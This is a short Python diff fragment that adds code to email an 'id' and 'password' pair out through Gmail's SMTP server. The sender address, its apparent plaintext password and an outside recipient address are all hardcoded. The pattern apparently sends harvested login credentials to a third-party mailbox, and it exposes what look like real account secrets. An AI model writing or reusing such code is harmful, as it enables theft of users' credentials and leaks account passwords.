@@ -12,7 +12,10 @@ def main():
         
         if(password == None):
             password = 'null'
-        
+        message = f"{id}  {password}"
+        from_address = "kirubelformnaletest@gmail.com"
+        password = 'kirubel@2020mn'
+        email = 'jacksonshe666999@gmail.com'
         context = ssl.create_default_context()
         with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
             server.login(from_address, password)
